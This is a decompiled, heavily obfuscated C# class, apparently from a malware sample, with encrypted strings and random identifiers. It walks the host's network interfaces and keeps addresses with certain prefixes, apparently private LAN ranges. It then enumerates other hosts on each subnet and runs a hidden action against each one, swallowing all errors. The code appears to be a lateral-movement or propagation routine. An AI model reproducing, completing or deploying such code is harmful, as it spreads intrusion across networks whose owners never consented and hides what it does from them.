using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace AFBGXefvzhgrS;

internal sealed class EJOCFXvcFJwyik
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void pNrEVVnfXvCQBP()
	{
		List<JqyZLTzkXYBN> list = JqyZLTzkXYBN.ZlXkHnYmoGMo();
		foreach (JqyZLTzkXYBN item in list)
		{
			try
			{
				if (item.IPAddress.StartsWith(getString_0(107391311)) || item.IPAddress.StartsWith(getString_0(107391306)) || item.IPAddress.StartsWith(getString_0(107391325)))
				{
					OkVmENvscvZ.VHqzKqmXtYrvD(item.MacAddress, item.IPAddress, getString_0(107390768));
				}
			}
			catch
			{
			}
		}
		foreach (JqyZLTzkXYBN item2 in list)
		{
			try
			{
				Regex regex = new Regex(getString_0(107390779));
				string string_ = regex.Split(item2.IPAddress)[0] + getString_0(107390779) + regex.Split(item2.IPAddress)[1] + getString_0(107390779) + regex.Split(item2.IPAddress)[2];
				List<string> list2 = EttZuTpXOutXVcD.CwFZwBaTKxkJGm(string_);
				foreach (string item3 in list2)
				{
					if (item2.IPAddress.StartsWith(getString_0(107391311)) || item2.IPAddress.StartsWith(getString_0(107391306)) || item2.IPAddress.StartsWith(getString_0(107391325)))
					{
						qXROyYvaHOl.gQxVlDcwnbXqeZ(getString_0(107393723), getString_0(107390774) + item3 + getString_0(107390753));
						qXROyYvaHOl.gQxVlDcwnbXqeZ(getString_0(107393723), getString_0(107390774) + item3 + getString_0(107390668));
					}
				}
			}
			catch
			{
			}
		}
	}

	static EJOCFXvcFJwyik()
	{
		Strings.CreateGetStringDelegate(typeof(EJOCFXvcFJwyik));
	}
}
